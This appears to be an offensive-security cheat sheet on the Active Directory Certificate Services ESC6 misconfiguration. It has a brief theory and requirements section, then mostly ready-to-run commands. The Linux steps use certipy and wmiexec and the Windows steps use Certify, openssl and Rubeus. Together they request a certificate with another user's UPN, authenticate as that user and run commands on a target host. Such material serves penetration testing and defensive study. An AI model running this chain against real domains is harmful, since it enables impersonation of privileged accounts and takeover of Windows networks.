# ESC6—CA-level UserSpecifiedSAN (EDITF_ATTRIBUTESUBJECTALTNAME2)

## Theory

> [!summary] Overview
>
> If the CA has **EDITF_ATTRIBUTESUBJECTALTNAME2** enabled (a.k.a. **UserSpecifiedSAN: Enabled**), enrollees can inject arbitrary SAN/UPN values in CSRs for **any** template, including ones (e.g., `User`) that normally don’t allow SANs. This effectively turns those templates into ESC1-style impersonation paths. 

> [!important]
>
> Microsoft patched this behavior in the **May 2022** updates (CVE-2022-26923), but misconfigured/unpatched environments may still be vulnerable.

## Requirements

- CA flag **UserSpecifiedSAN / EDITF_ATTRIBUTESUBJECTALTNAME2 = Enabled**.
- A template permitting **Client Authentication** EKU (e.g., `User`) and enroll rights for low-privileged users.
- Environment not enforcing the May 2022 hardening (or otherwise still honoring the CA flag).

### Placeholders

`<DOMAIN>` `<USER>` `<PASS>` `<DC_IP>` `<CA_NAME>` `<CA_FQDN>` `<TARGET_UPN>` `<TARGET_USER>` `<PFX_FILE>` `<TARGET_HOST_FQDN>`

---

## Linux

### Enumerate CA

```bash
certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout
# In "Certificate Authorities", confirm: User Specified SAN : Enabled
```

### Exploit (request Cert with Alternate UPN via CSR)

```bash
certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -template 'User' -upn '<TARGET_UPN>' \
  -out '<PFX_FILE>'
# Expect: "Got certificate with UPN '<TARGET_UPN>'" and often "Certificate has no object SID"
```

### Authenticate (PKINIT) and Use TGT

```bash
certipy auth -pfx '<PFX_FILE>.pfx' -domain '<DOMAIN>' -dc-ip <DC_IP>
KRB5CCNAME='<TARGET_USER>.ccache' wmiexec.py -k -no-pass <TARGET_HOST_FQDN>
```

---

## Windows

### Enumerate CA

```powershell
.\Certify.exe cas
# In "Enterprise/Enrollment CAs": look for
#   [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set
```

### Exploit (request Cert with Altname on Normally non-SAN template)

```powershell
.\Certify.exe request /ca:<CA_FQDN>\<CA_NAME> /template:User /altname:<TARGET_UPN> > cert.pem
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 `
  -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" `
  -export -out cert.pfx
```

### Authenticate as Target

```powershell
.\Rubeus.exe asktgt /user:<TARGET_USER> /certificate:cert.pfx /nowrap
# Use returned TGT (kirbi) or /getcredentials to retrieve NTLM if permitted
.\Rubeus.exe createnetonly /program:powershell.exe /show
.\Rubeus.exe ptt /ticket:<BASE64_TGT>
```
